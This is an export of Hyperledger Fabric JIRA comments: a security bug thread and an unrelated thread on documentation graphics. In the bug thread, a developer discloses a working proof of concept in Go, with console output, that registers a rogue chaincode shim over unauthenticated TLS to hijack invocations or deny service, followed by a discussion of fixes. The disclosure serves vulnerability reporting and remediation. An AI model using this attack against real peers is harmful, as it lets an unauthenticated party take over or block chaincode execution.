{quote}I agree with reducing the priority here. It would be very, very difficult to pull off the race condition
{quote}
Actually I managed to pull off that race condition with very good results (almost always works), since the peer behaves deterministically and hence the timing is also.
 I managed to have a peer running with TLS and simulated a client via peer CLI that I ran via the IDE (yeah I know, it's ugly, but I needed everything to be in the same process and also I needed the chaincode golang code base)

The attack is as follows: 
 1) I connect to the peer via a non-authenticated gRPC stream (but via TLS, without a client cert since the peer doesn't enforce it)
 2) I wait a certain time, it's always the same time I need to wait.
 3) I send a query transaction to query A (example02) to the peer via invoking peer CLI 
 4) The peer creates a chaincode handler, and instead of starting the container, it sees my gRPC stream and assumes the container is already up
 5) The peer sends to the IDE process a transaction message to query A
 6) The message gets to my IDE process and runs my malicious chaincode shim that returns ""HACKED"" for everything
 7) The result is returned to the peer CLI

The pseudo code that shows the attack in work is:

Notice I do 4 invokes:
{code:java}
	go func() {
		m := newMediator(config.Peer.OrderingEndpoint)
		res, _ := m.invoke(""yacov"", ""exampleCC"", []string{""query"", ""a""})
		fmt.Println(string(res))
		res, _ = m.invoke(""yacov"", ""exampleCC"", []string{""query"", ""a""})
		fmt.Println(string(res))
		res, _ = m.invoke(""yacov"", ""exampleCC"", []string{""query"", ""a""})
		fmt.Println(string(res))
		res, _ = m.invoke(""yacov"", ""exampleCC"", []string{""query"", ""a""})
		fmt.Println(string(res))
	}()
time.Sleep(some_time)
chat()
{code}
the *chat()* creates a stream with the peer and impersonates a chaincode shim.

while the *mediator* object is simply the peer CLI in another form:
{code:java}
	broadcastClient, err := common.GetBroadcastClient(ordererEndpoint, true, ""/home/yacovm/fabricDeployment/vm1/sampleconfig/tls/ca.crt"")
	if err != nil {
		panic(err)
	}
	endorserClient, err := common.GetEndorserClient()
	if err != nil {
		panic(err)
	}
	signer, err := common.GetDefaultSigner()
	if err != nil {
		panic(err)
	}
	return &mediator{
		broadcastClient: broadcastClient,
		signer:          signer,
		endorserClient:  endorserClient,
	}
{code}
The chaincode that actually runs (instead of the container chaincode example02 which doesn't launch because the peer decides it doesn't need to) is the chaincode from my IDE:
{code:java}
type cc struct {

}

func (*cc) Init(stub shim.ChaincodeStubInterface) pb.Response {
	panic(""implement me"")
}

func (*cc) Invoke(stub shim.ChaincodeStubInterface) pb.Response {
	return shim.Success([]byte(""HACKED""))
}
{code}
and the IDE console prints:
{code:java}
mspIdD: PeerOrg
 mspMgrConfigDir: /home/yacovm/fabricDeployment/crypto-config/peerOrganizations/hrl.ibm.il/users/User1@hrl.ibm.il/msp
 RECV: type:REGISTERED 
 RECV: type:READY txid:""0ae6457546317b049ad909282f4ee179574c0e55c2decb2c327488afa0f2894b"" proposal:<proposal_bytes:""\n\226\007\nh\010\003\032\014\010\304\242\221\312\005\020\350\210\374\324\001\""\005yacov*@0ae6457546317b049ad909282f4ee179574c0e55c2decb2c327488afa0f2894b:\r\022\013\022\texampleCC\022\251\006\n\214\006\n\007PeerOrg\022\200\006-----BEGIN -----\nMIICGzCCAcKgAwIBAgIQdC7vc2bH1QRP7qSbQsZuNTAKBggqhkjOPQQDAjBnMQsw\nCQYDVQQGEwJVUzETMBEGA1UECBMKQ2FsaWZvcm5pYTEWMBQGA1UEBxMNU2FuIEZy\nYW5jaXNjbzETMBEGA1UEChMKaHJsLmlibS5pbDEWMBQGA1UEAxMNY2EuaHJsLmli\nbS5pbDAeFw0xNzA2MTYxOTUzNTZaFw0yNzA2MTQxOTUzNTZaMFUxCzAJBgNVBAYT\nAlVTMRMwEQYDVQQIEwpDYWxpZm9ybmlhMRYwFAYDVQQHEw1TYW4gRnJhbmNpc2Nv\nMRkwFwYDVQQDDBBVc2VyMUBocmwuaWJtLmlsMFkwEwYHKoZIzj0CAQYIKoZIzj0D\nAQcDQgAEWqmP+eCViadJ5GjF+0h5Czy+PrBzHGbpCIAaaKEOzgkOW/EvzqLGg2xh\njxWbTfQG1XwEOPEsJarfQMTrllxABKNiMGAwDgYDVR0PAQH/BAQDAgWgMBMGA1Ud\nJQQMMAoGCCsGAQUFBwMBMAwGA1UdEwEB/wQCMAAwKwYDVR0jBCQwIoAgOPIOmUnW\nV2slY0AusHs2MbSKsI3TecLIWb4aq75Wuv0wCgYIKoZIzj0EAwIDRwAwRAIgASAM\neILo8GZKnEr+Oy6URZlgxvROqXqDU4NunZrYKO4CIGBwTV5Rzet+ej048LqIlDMg\nRrN2PMxD7sqOv0FpZjyp\n-----END -----\n\022\030\270\325\255<\344\2768\256\342\026v\325a-\272\346\310\3735A\243<\2373\022\037\n\035\n\033\010\001\022\013\022\texampleCC\032\n\n\005query\n\001a"" signature:""0D\002 \023\3345\007\316m\023\315K\356P\301\232V\212\232\000V*\251_\351\253a\266e8Pq<cA\002 \014\333!4\272\206\241\365\303\001\355>\361\006\317\344z\263\003pf[\317\212H\025\272\366 \223\316\230"" > 
 RECV: type:TRANSACTION payload:""\n\005query\n\001a"" txid:""0ae6457546317b049ad909282f4ee179574c0e55c2decb2c327488afa0f2894b"" proposal:<proposal_bytes:""\n\226\007\nh\010\003\032\014\010\304\242\221\312\005\020\350\210\374\324\001\""\005yacov*@0ae6457546317b049ad909282f4ee179574c0e55c2decb2c327488afa0f2894b:\r\022\013\022\texampleCC\022\251\006\n\214\006\n\007PeerOrg\022\200\006-----BEGIN -----\nMIICGzCCAcKgAwIBAgIQdC7vc2bH1QRP7qSbQsZuNTAKBggqhkjOPQQDAjBnMQsw\nCQYDVQQGEwJVUzETMBEGA1UECBMKQ2FsaWZvcm5pYTEWMBQGA1UEBxMNU2FuIEZy\nYW5jaXNjbzETMBEGA1UEChMKaHJsLmlibS5pbDEWMBQGA1UEAxMNY2EuaHJsLmli\nbS5pbDAeFw0xNzA2MTYxOTUzNTZaFw0yNzA2MTQxOTUzNTZaMFUxCzAJBgNVBAYT\nAlVTMRMwEQYDVQQIEwpDYWxpZm9ybmlhMRYwFAYDVQQHEw1TYW4gRnJhbmNpc2Nv\nMRkwFwYDVQQDDBBVc2VyMUBocmwuaWJtLmlsMFkwEwYHKoZIzj0CAQYIKoZIzj0D\nAQcDQgAEWqmP+eCViadJ5GjF+0h5Czy+PrBzHGbpCIAaaKEOzgkOW/EvzqLGg2xh\njxWbTfQG1XwEOPEsJarfQMTrllxABKNiMGAwDgYDVR0PAQH/BAQDAgWgMBMGA1Ud\nJQQMMAoGCCsGAQUFBwMBMAwGA1UdEwEB/wQCMAAwKwYDVR0jBCQwIoAgOPIOmUnW\nV2slY0AusHs2MbSKsI3TecLIWb4aq75Wuv0wCgYIKoZIzj0EAwIDRwAwRAIgASAM\neILo8GZKnEr+Oy6URZlgxvROqXqDU4NunZrYKO4CIGBwTV5Rzet+ej048LqIlDMg\nRrN2PMxD7sqOv0FpZjyp\n-----END -----\n\022\030\270\325\255<\344\2768\256\342\026v\325a-\272\346\310\3735A\243<\2373\022\037\n\035\n\033\010\001\022\013\022\texampleCC\032\n\n\005query\n\001a"" signature:""0D\002 \023\3345\007\316m\023\315K\356P\301\232V\212\232\000V*\251_\351\253a\266e8Pq<cA\002 \014\333!4\272\206\241\365\303\001\355>\361\006\317\344z\263\003pf[\317\212H\025\272\366 \223\316\230"" > 
 HACKED
 RECV: type:TRANSACTION payload:""\n\005query\n\001a"" txid:""aaae92f5fab6f7cd85d3396968014f590a2d10ecdd4004bc328b3e87edb61d91"" proposal:<proposal_bytes:""\n\226\007\nh\010\003\032\014\010\304\242\221\312\005\020\266\303\364\202\002\""\005yacov*@aaae92f5fab6f7cd85d3396968014f590a2d10ecdd4004bc328b3e87edb61d91:\r\022\013\022\texampleCC\022\251\006\n\214\006\n\007PeerOrg\022\200\006-----BEGIN -----\nMIICGzCCAcKgAwIBAgIQdC7vc2bH1QRP7qSbQsZuNTAKBggqhkjOPQQDAjBnMQsw\nCQYDVQQGEwJVUzETMBEGA1UECBMKQ2FsaWZvcm5pYTEWMBQGA1UEBxMNU2FuIEZy\nYW5jaXNjbzETMBEGA1UEChMKaHJsLmlibS5pbDEWMBQGA1UEAxMNY2EuaHJsLmli\nbS5pbDAeFw0xNzA2MTYxOTUzNTZaFw0yNzA2MTQxOTUzNTZaMFUxCzAJBgNVBAYT\nAlVTMRMwEQYDVQQIEwpDYWxpZm9ybmlhMRYwFAYDVQQHEw1TYW4gRnJhbmNpc2Nv\nMRkwFwYDVQQDDBBVc2VyMUBocmwuaWJtLmlsMFkwEwYHKoZIzj0CAQYIKoZIzj0D\nAQcDQgAEWqmP+eCViadJ5GjF+0h5Czy+PrBzHGbpCIAaaKEOzgkOW/EvzqLGg2xh\njxWbTfQG1XwEOPEsJarfQMTrllxABKNiMGAwDgYDVR0PAQH/BAQDAgWgMBMGA1Ud\nJQQMMAoGCCsGAQUFBwMBMAwGA1UdEwEB/wQCMAAwKwYDVR0jBCQwIoAgOPIOmUnW\nV2slY0AusHs2MbSKsI3TecLIWb4aq75Wuv0wCgYIKoZIzj0EAwIDRwAwRAIgASAM\neILo8GZKnEr+Oy6URZlgxvROqXqDU4NunZrYKO4CIGBwTV5Rzet+ej048LqIlDMg\nRrN2PMxD7sqOv0FpZjyp\n-----END -----\n\022\030#\341\363X\265\271\013\307\374\326(V$\3366|\372q#\037\321^\254%\022\037\n\035\n\033\010\001\022\013\022\texampleCC\032\n\n\005query\n\001a"" signature:""0D\002 6\332\261Za\016\347_ g\002c\370\361\243\256\210?t#.\275\035c\3502\265\263\272\034N\003\002 #\222]Zn\261T\260\334>\247\254\365f>\013`\2772\000\235\254\271\214F\300$\007=\273\205\311"" > 
 HACKED
 RECV: type:TRANSACTION payload:""\n\005query\n\001a"" txid:""0ed45515048befb8ea268a341ad203aacfc2e64b98af4bc3641d04579354d7f3"" proposal:<proposal_bytes:""\n\226\007\nh\010\003\032\014\010\304\242\221\312\005\020\210\256\350\210\002\""\005yacov*@0ed45515048befb8ea268a341ad203aacfc2e64b98af4bc3641d04579354d7f3:\r\022\013\022\texampleCC\022\251\006\n\214\006\n\007PeerOrg\022\200\006-----BEGIN -----\nMIICGzCCAcKgAwIBAgIQdC7vc2bH1QRP7qSbQsZuNTAKBggqhkjOPQQDAjBnMQsw\nCQYDVQQGEwJVUzETMBEGA1UECBMKQ2FsaWZvcm5pYTEWMBQGA1UEBxMNU2FuIEZy\nYW5jaXNjbzETMBEGA1UEChMKaHJsLmlibS5pbDEWMBQGA1UEAxMNY2EuaHJsLmli\nbS5pbDAeFw0xNzA2MTYxOTUzNTZaFw0yNzA2MTQxOTUzNTZaMFUxCzAJBgNVBAYT\nAlVTMRMwEQYDVQQIEwpDYWxpZm9ybmlhMRYwFAYDVQQHEw1TYW4gRnJhbmNpc2Nv\nMRkwFwYDVQQDDBBVc2VyMUBocmwuaWJtLmlsMFkwEwYHKoZIzj0CAQYIKoZIzj0D\nAQcDQgAEWqmP+eCViadJ5GjF+0h5Czy+PrBzHGbpCIAaaKEOzgkOW/EvzqLGg2xh\njxWbTfQG1XwEOPEsJarfQMTrllxABKNiMGAwDgYDVR0PAQH/BAQDAgWgMBMGA1Ud\nJQQMMAoGCCsGAQUFBwMBMAwGA1UdEwEB/wQCMAAwKwYDVR0jBCQwIoAgOPIOmUnW\nV2slY0AusHs2MbSKsI3TecLIWb4aq75Wuv0wCgYIKoZIzj0EAwIDRwAwRAIgASAM\neILo8GZKnEr+Oy6URZlgxvROqXqDU4NunZrYKO4CIGBwTV5Rzet+ej048LqIlDMg\nRrN2PMxD7sqOv0FpZjyp\n-----END -----\n\022\030\006\212\213&\261;\320\003G\024\244\002\200\346\032\032\013\2322C\376\030`)\022\037\n\035\n\033\010\001\022\013\022\texampleCC\032\n\n\005query\n\001a"" signature:""0D\002 (\371\277\304cV\257\341H\336\363\260IR@\270\345\036\222\213\246\203\357\255I\357:>\260\024\210.\002 O\215KVX\""\323\251\202`\322\336 \177\000J\360\317W\340\243~\327\314i[\302\322x\273gz"" > 
 HACKED
 RECV: type:TRANSACTION payload:""\n\005query\n\001a"" txid:""a109b08ab73b495a87d648a9490e2aedd737bb22620c9e5f121213c439ca2acd"" proposal:<proposal_bytes:""\n\225\007\ng\010\003\032\013\010\325\242\221\312\005\020\250\364\220?\""\005yacov*@a109b08ab73b495a87d648a9490e2aedd737bb22620c9e5f121213c439ca2acd:\r\022\013\022\texampleCC\022\251\006\n\214\006\n\007PeerOrg\022\200\006-----BEGIN -----\nMIICGzCCAcKgAwIBAgIQdC7vc2bH1QRP7qSbQsZuNTAKBggqhkjOPQQDAjBnMQsw\nCQYDVQQGEwJVUzETMBEGA1UECBMKQ2FsaWZvcm5pYTEWMBQGA1UEBxMNU2FuIEZy\nYW5jaXNjbzETMBEGA1UEChMKaHJsLmlibS5pbDEWMBQGA1UEAxMNY2EuaHJsLmli\nbS5pbDAeFw0xNzA2MTYxOTUzNTZaFw0yNzA2MTQxOTUzNTZaMFUxCzAJBgNVBAYT\nAlVTMRMwEQYDVQQIEwpDYWxpZm9ybmlhMRYwFAYDVQQHEw1TYW4gRnJhbmNpc2Nv\nMRkwFwYDVQQDDBBVc2VyMUBocmwuaWJtLmlsMFkwEwYHKoZIzj0CAQYIKoZIzj0D\nAQcDQgAEWqmP+eCViadJ5GjF+0h5Czy+PrBzHGbpCIAaaKEOzgkOW/EvzqLGg2xh\njxWbTfQG1XwEOPEsJarfQMTrllxABKNiMGAwDgYDVR0PAQH/BAQDAgWgMBMGA1Ud\nJQQMMAoGCCsGAQUFBwMBMAwGA1UdEwEB/wQCMAAwKwYDVR0jBCQwIoAgOPIOmUnW\nV2slY0AusHs2MbSKsI3TecLIWb4aq75Wuv0wCgYIKoZIzj0EAwIDRwAwRAIgASAM\neILo8GZKnEr+Oy6URZlgxvROqXqDU4NunZrYKO4CIGBwTV5Rzet+ej048LqIlDMg\nRrN2PMxD7sqOv0FpZjyp\n-----END -----\n\022\030|B9\305\203\213\204\352^\374O\303\324\221\262\343\032VD\006\276\306n1\022\037\n\035\n\033\010\001\022\013\022\texampleCC\032\n\n\005query\n\001a"" signature:""0D\002 \013z\201\264\225n\273\345\204\261\221R\226\303!\375\321\013\352\377id\014\216(i\362Z\010\025\256\222\002 \002\367S\227\301~\224#~\336\022x\222\2328\005\227\231\034\372v1R\216\325C\200\311\304\312\250~"" > 
 HACKED
 {code}

Notice the 4 invokes from my example are shown here, meaning- if an attacker manages to pull this off, it de facto controls the chaincode logic for all invokes to the chaincode.;;;","17/Jun/17 7:24 AM;binhn;[~yacovm]  very nifty work and thanks.

Hey everyone, we have a security hacker on the team :)

Seriously, as I commented above, we need to fix this problem. 

[~JonathanLevi], [~mastersingh24]  I know you both wanted to lower the priority here, but with the info from Yacov, I am upping the priority, but in any case, Ale said he will have the CR by Monday. ;;;","17/Jun/17 7:36 AM;yacovm;Something I forgot to mention:
An attacker doesn't need to ""win the race"" in order to cause damage: as long as you know the name of the chaincode, you can connect to the peer and send a REGISTER request to the peer, and then when an invocation is sent to the peer it will *not* start the container because it would deem the chaincode already running because the peer-side chaincode handler registered the attacker's gRPC stream.
This means that *anyone*, can connect to a peer *without any certificate* and then do denial of service: the peer would get a chaincode invocation request from an honest client, and would activate the FSM code - which would fail, and the chaincode invocation would time-out.

{quote} - in the long term (post v1) we may consider solutions where the peer generates on the fly tls-certs and cert secrets (one per chaincode), or/and more invasive alternatives.{quote}
If I may chime in here, and I may think too much in ""all or nothing"" terms but I think that if we are to fix this, we should fix it once and for all and have the best fix possible.
The best fix possible in my opinion is to have a TLS certificate per chaincode instance, and not globally. 
Otherwise, a malicious chaincode could connect to the peer and register a gRPC stream under any chaincode name, hence starving the peer of chaincode invocation ability. ;;;","17/Jun/17 10:26 PM;mastersingh24;My points are simple:

1) So after more than a year, we decide that this is an issue?   Note:  I've brought up similar issues multiple times and no one seemed to think it was an issue

2) If we all consider this a serious flaw, then we need to go all in to fix it (basically the same point as [~yacovm] was making):

- chaincode server endpoint should be separate from the peer endpoint (as the peer endpoint must be widely accessible on a network)
- agree with using mutual TLS
- TLS key pair(s) should be randomly generated anytime the container needs to be started / registered

This is not a small thing to do;;;","17/Jun/17 10:52 PM;yacovm;{quote}chaincode server endpoint should be separate from the peer endpoint (as the peer endpoint must be widely accessible on a network){quote}
I think that this is a good opportunity to do this too, as the chaincode and the peer ""come together"" and it's not a real API change, it's an internal one.

With this, we could use a different TLS server configuration - one that for example, isn't influenced by the existing TLS root CA cert pool, [~ales] what do you think? won't that help your change set somehow, with the DN issue?;;;","17/Jun/17 11:06 PM;ales;Thx [~mastersingh24] and [~yacovm]


> 1) So after more than a year, we decide that this is an issue? Note: I've brought up similar issues multiple times and no one seemed to think it was an issue

Unfortunately I wasn't present when you discussed this, I'd have certainly backed you up! I raised the issue as soon as I spotted it.

> This is not a small thing to do

Agreed also on this front!

FWIW, I'd draw the line as follows: we can't ship if a remote unprivileged attacker can always DoS (as described by Yacov) and may even be able to impersonate if it wins the race. Everything else is ""good to have"". [~elli-androulaki], [~ellaki], [~angelo.decaro], wdyt?
 ;;;","18/Jun/17 12:19 AM;muralisr; 

There are 4 main entry points for chaincode
 # in process (as done in UT, system chaincodes etc) that create a stream and registers a chaincode
 # in host (as in chaincodedev mode, docker daemon on the host, etc) connecting via TLS
 # external to the host but within the network protection perimeter connecting via TLS
 # external to the network connecting via TLS

In both 1) and 2) the peer env is directly hacked into and all bets are off about its integrity in general. The whole peer is a casualty at this point and can be considered malicious.

[~yacovm] From my reading, seems the ""Chat"" function falls into 1. Or you did 3 or 4 and I misread it ? 

If the test does not fall into 4 (or even 3 for that matter) I don't see this a High - compared with the risk of doing an invasive change this close to release that may be higher. And then I agree with [~mastersingh24] point about the difficulty in exploiting the race and can see arguments about network protection ([~ashutosh_kumar]) being relevant here. 

FWIW, to tag on to [~mastersingh24] point, we have been wanting to run chaincode on a different port (and also talked about mutual auth in the past). Just wanted to make sure we fully understand the concerns here before go off and do something risky at this point.

 ;;;","18/Jun/17 2:15 AM;yacovm;{quote}3. external to the host but within the network protection perimeter connecting via TLS
4. external to the network connecting via TLS{quote}
They are the same. Also keep in mind that the peer doesn't do mutual TLS and the chaincode server-side stream doesn't do *any* checks of the certificate of the client, and doesn't check for an existence of such. TLS doesn't protect the peer here, it's worthless in this aspect. It actually protects the chaincode from connecting to a peer that impersonates the real peer, and of course - encrypts your traffic. 

{quote}Yacov Manevich From my reading, seems the ""Chat"" function falls into 1. Or you did 3 or 4 and I misread it ? {quote}
So the ""chat()"" function is:
{code}
	creds := &tls.Config{
		InsecureSkipVerify: true,
	}
	conn, err := grpc.Dial(viper.GetString(""peer.address""), grpc.WithBlock(), grpc.WithTimeout(time.Second), grpc.WithTransportCredentials(credentials.NewTLS(creds)))
	if err != nil {
		panic(err)
	}
	defer conn.Close()
	chaincodeSupportClient := pb.NewChaincodeSupportClient(conn)

	stream, err := chaincodeSupportClient.Register(context.Background())
	shim.ChatWithPeer(ccName, stream, &cc{})
{code}

Notice I didn't use a certificate to prime the TLS credentials. 

I ran the IDE from a linux VM and the peer is running on another VM on the same LAN. Clearly - this is 3 and 4 from your list. 

{quote}compared with the risk of doing an invasive change this close to release that may be higher. {quote}
This invasive change is well tested by our integration tests, since our integration tests use TLS and invoke chaincode.
{quote} And then I agree with Gari Singh point about the difficulty in exploiting the race {quote}
The problem with the race thing, that the time you need to wait is deterministic. It's the same time, each time. ;;;","18/Jun/17 2:27 AM;ales;Let me bring a perspective from my field: the security world uses CVSS as a way of measuring vulnerabilities. Scores range from 0 to 10, with 10 being the most severe. I would rate this as 9.7 with the following vector

[https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator?vector=(AV:N/AC:L/Au:N/C:P/I:C/A:C)]

Many companies require VP-level approval to ship a product with a 9.7 CVSS.;;;","18/Jun/17 2:39 AM;ales;The scoring in my previous comment could be argued as ""worst-case"". A more conservative vector might be 

[https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator?vector=(AV:N/AC:L/Au:N/C:P/I:P/A:P])

which leads to 7.5 - a bit better but still pretty serious.;;;","18/Jun/17 2:48 AM;muralisr;[~yacovm] [~ales] thanks. That helps... will look at the CR (connection a bit spotty as I'm on the road so will update when I can).;;;","18/Jun/17 9:55 AM;muralisr;Did some test to get to root cause... peer knows its a chaincode not started by it (look at the last two lines in the logs below)... but does nothing about it. This should be something to be nipped in the bud right upfront .

When not in devmode, peer should kick the chaincode out right at the time of Register instead of keeping it around. Then the window for it to sneak in would be between the startup of the container from invoke and the devmode-like attacker chaincode trying to get in before it got kicked out (that would be real tricky).  This is the actual race [~mastersingh24] mentioned earlier.

{code:java}
2017-06-17 20:23:34.871 EDT [chaincode] HandleChaincodeStream -> DEBU 30c Current context deadline = 0001-01-01 00:00:00 +0000 UTC, ok = false
2017-06-17 20:23:34.871 EDT [chaincode] processStream -> DEBU 30d []Received message REGISTER from shim
2017-06-17 20:23:34.871 EDT [chaincode] HandleMessage -> DEBU 30e []Fabric side Handling ChaincodeMessage of type: REGISTER in state created
2017-06-17 20:23:34.871 EDT [chaincode] beforeRegisterEvent -> DEBU 30f Received REGISTER in state created
2017-06-17 20:23:34.871 EDT [chaincode] registerHandler -> DEBU 310 registered handler complete for chaincode mycc:0
2017-06-17 20:23:34.871 EDT [chaincode] beforeRegisterEvent -> DEBU 311 Got REGISTER for chaincodeID = name:""mycc:0"" , sending back REGISTERED
2017-06-17 20:23:34.871 EDT [chaincode] notifyDuringStartup -> DEBU 312 nothing to notify (dev mode ?)
2017-06-17 20:23:34.871 EDT [chaincode] notifyDuringStartup -> WARN 313 trying to manually run chaincode when not in devmode ?
{code}

Kicking out  the external chaincode when not in devmode and not allowing it to REGISTER ... this doesn't make the TLS connection more secure - so we still do need to consider this JIRA - but  makes it more difficult to exploit than [~yacovm] did. 

I'll look into that too and update by tomorrow.;;;","18/Jun/17 3:12 PM;yacovm;{quote}Kicking out the external chaincode when not in devmode and not allowing it to REGISTER ... this doesn't make the TLS connection more secure - so we still do need to consider this JIRA - but makes it more difficult to exploit than Yacov Manevich did.
{quote}
What do you mean by *makes it more difficult to exploit than Yacov did* ? 
 It is not hard to sneak into the time window because when you attempt to do so, you can simply iterate in small increments of time (i.e 1 ms, 2ms, ... ) until you're in.
 The fact that your register your chaincode shim *before* the invoke promises you the real container would never block you - meaning, you have an infinite amount of attempts you can do, and you don't need that many.;;;","18/Jun/17 5:15 PM;muralisr;[~yacovm] The fundamental issue is that we don't kick out an externally launched chaincod but allow it to register. I believe your test made use if this by registering a chaincode and when it didn't get kicked out, had to just stay there for the ""good"" chaincode to be launched so it can take the context. This is not much of a race and easily exploited.

The sequence of events
# launch the external CC registers and wait (it should have been kicked out but was not)
# at some point the good chaincode gets launched by the peer in response to an invoke
# the peer thinks the registration from the waiting bad stream is the right one and starts using it
# the good chaincode tries to register but fails

If the bad chaincode gets kicked out, clearly step 1 above won't work. To exploit the window is much harder
# somehow know when a chaincode is about to be launched (or keep trying registration of the external chaincode in a loop)
# the good chaincode gets launched by the peer 
# the bad chaincode comes in and registers before the good chaincode can
# the good chaincode attempts to register but fails

The second case is race in the true sense of the word.  

Bottom line - regardless of what we do with TLS, we should kick the bad external chaincode out when not in dev mode. I have put this out in a WIP CR https://gerrit.hyperledger.org/r/#/c/10747/ so we can reason and even just test it out.

This fix is necessary from chaincode functionality point of view (we should kick out external chaincodes unless in dev mode). The TLS approach is necessary from a security point of view. 

(Now I have to sleep .. :-) )

;;;","19/Jun/17 12:26 AM;muralisr;The https://gerrit.hyperledger.org/r/#/c/10747 is ready. I left in the WIP so it doesn't get merged accidently till we are clear on the direction for this JIRA.;;;","21/Jun/17 3:30 AM;binhn;Since we have addressed the critical part of this defect, I am creating a related defect to capture the remaining task (mutual TLS) from here as improvement for future release FAB-4894.;;;",,,,,,,,,,,
Writing First App / What Applications Do - Graphic,FAB-4752,18044,17261,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,joe-alewine,SarahMills,SarahMills,15/Jun/17 10:57 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,06/Oct/17 5:56 AM,,,,,,,,,,,,0,,,,,,,http://fabricstaging.readthedocs.io/en/latest/write_first_app.html#what-applications-do,,odowdaibm,SarahMills,seanbarclay,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Jun/17 4:42 AM;SarahMills;What Applications Do.png;https://jira.hyperledger.org/secure/attachment/11504/What+Applications+Do.png","30/Jun/17 4:45 AM;SarahMills;What Applications Do.svg;https://jira.hyperledger.org/secure/attachment/11509/What+Applications+Do.svg","17/Jun/17 1:47 AM;odowdaibm;image-2017-06-16-17-47-23-825.png;https://jira.hyperledger.org/secure/attachment/11186/image-2017-06-16-17-47-23-825.png",,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2z3:",,,,,,,,,,,,,,,,,,,,,,,odowdaibm,SarahMills,seanbarclay,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Jun/17 10:58 PM;SarahMills;[~odowdaibm] re-reading the text for this graphic, it seems a little early to add in the developer's identity. Thoughts?;;;","16/Jun/17 8:10 PM;odowdaibm;I like the application, identity and smart contract icons.  They are clear, and particularly with the smart contract, the multiple lines and ticks make it both seem like a contract and technically represent that a contract has several functions.  Very good.

 

The flow lines between the App and Network are fine as well, nice and clear.

 

I'm a little less sure on the oval for the network, but it makes sense as we rounded the corners in our network, so oval is fine.  I think maybe that it doesn't have a defined boundary, in that there's no line around it.  I wonder what a solid, or dashed line around it would look like? Overall though, I'm fine with an oval.

 

I really don't like the ledger icon.  1) It's 3d, so it's too hard to draw on whiteboards.  2) It doesn't look like a ledger, but a set of blocks.  In a ledger, in common parlance, as well as a blockchain, and especially HLF, there are 2 elements, namely a set of records that correspond to the credits/debits (i.e. transactions) that have occurred, and the current and previous balance at the top and bottom of the page. That was the reason we used something like this:  [https://thenounproject.com/term/ledger/]  (or the document shape in Powerpoint - becuase it's easy.) 

 

If you wanted to look at the ledger in more detail, then we'd show the two elements - the transaction log - which can be a set of blocks, and the balance (the world state in HLF parlance) as a database.  I've updated the proposal deck to represent these ideas - see chart 20 of this: [https://drive.google.com/drive/folders/0B-n-iLEM1iXrWk9WWERhaHVyeWc?ths=true]  I'm not saying we should use this verbatim, but we need to get the ledger idea across.  Only when users need to dig deeper should they worry about the world state and transaction log.

 

Hope that makes some sense Sarah.

 

 ;;;","16/Jun/17 8:14 PM;odowdaibm;Forgot my other comment which was that loosing the user=developer from the diagram does worry me a little, but I'd be prepared to do that as it's implicit, and does appear in the identity, which is quite nice, as it could now represent *any* user's identity.  So all in all, I'm fine with that.

 

Thanks again, and apols not to include with other comment.;;;","16/Jun/17 10:16 PM;SarahMills;[~odowdaibm] re: the icons/visual representations for ledger and blockchain network—it will be important to use the same language across images in different sections of docs. [~yuleeandrea] and I have 2 different ways of representing peers and the network currently (see the ""Introduction"" graphics https://jira.hyperledger.org/browse/FAB-4759) and will want to see which is clearer/more accurate to people but also the most flexible graphically. Monday the design team will come up with a method for reviewing these all together and getting feedback...maybe a playback of some sort, but want to be cognizant of timelines.;;;","16/Jun/17 10:26 PM;odowdaibm;Yes, the visuals should be consistent.  My overarching concern is that hey are accessible to a wide range of users - which means relatable to the concept, easy to draw by hand, PPT, openoffice, SVG tools etc

 ;;;","16/Jun/17 10:30 PM;SarahMills;So for example, it's much harder to show a block being added to a ledger later on if we represent it as an book now—so next week we'll set something up to review them as a set and come up with shorthand ways to draw them on a whiteboard;;;","16/Jun/17 10:42 PM;odowdaibm;right, but a ledger has records - AND in common parlance.  AND a ledger has a balance.  The link (chart 20) could show these concepts if we put lines on the ledger to represent each update, whether to the transaction log or state.;;;","16/Jun/17 10:46 PM;odowdaibm;I guess my main point is that LEDGERS don't have BLOCKS, they have RECORDS.  The RECORDS that correspond to transactions are stored in a blockchain, as you say, but the RECORDS that correspond to the BALANCE or CURRENT POSITION are stored in the WORLD STATE.

 

Caps are not to SHOUT but to show CONCEPTS.

 ;;;","16/Jun/17 11:00 PM;SarahMills;Ok, I see what you are saying. I think if we want to break down the ledger into its requirements/components or the relationship, then that can be a separate graphic? I am concerned about the confusion of separating out the concepts of ledgers and blocks at this point—we'll set up a time to discuss.;;;","17/Jun/17 1:49 AM;odowdaibm;You are right Sarah - we should keep a simple, single image for a LEDGER.  When we need to go deeper, we can talk about the LEDGER.TRANSACTIONLOG or the LEDGER.WORLDSTATE. So my *advice* (FWIW lol) isn't to separate them out, but to do what you're proposing.

 

To this end, what about a visual that had a LEDGER symbol, with some kind of nod to the fact that it's a Blockchain too?

  !image-2017-06-16-17-47-23-825.png|width=141,height=141!

I know it smacks of compromise, but I think both concepts are important.  I'd be happy to leave off the World state database. Might that kind of thing work?

 

Anyway, just an idea.                                ;;;","19/Jun/17 1:08 PM;seanbarclay;just looking at Anthony's icon concept- i think it could work better if it was vertical. The top block would be the newest block. Taking this concept further in other focused and compartmentalized diagrams, you could pair hashes next to the block- similar to how you'd show it in a UI (e.g. BC Explorer, Composer, IBM Blockchain service monitor, etc. ). 

As for the diagram- one comment I have is the application is either invoking or querying a smart contract. if we had to over-simplify that i would say the application is interfacing with the smart contract. Second, the green oval is a bit too overwhelming. It overpowers the ledger and smart contract- which should be the focus. We could just have a  simple line or curve to show the barrier and separation without trying to encapsulate the whole network (because the application in truth is only communicating with the peer- not the whole network immediately). Hope that helps. ;;;","20/Jun/17 5:52 PM;odowdaibm;Oh sure, feel free to play with the idea - it was the idea of showing something simple to draw and keeping a ledger concept and a blockchain concept together.  I agree that vertical might look nicer - you're right it does imply time a little more - the top as newest as you say.

 

I think *run* a smart contract is simpler than *interfacing with*.

 

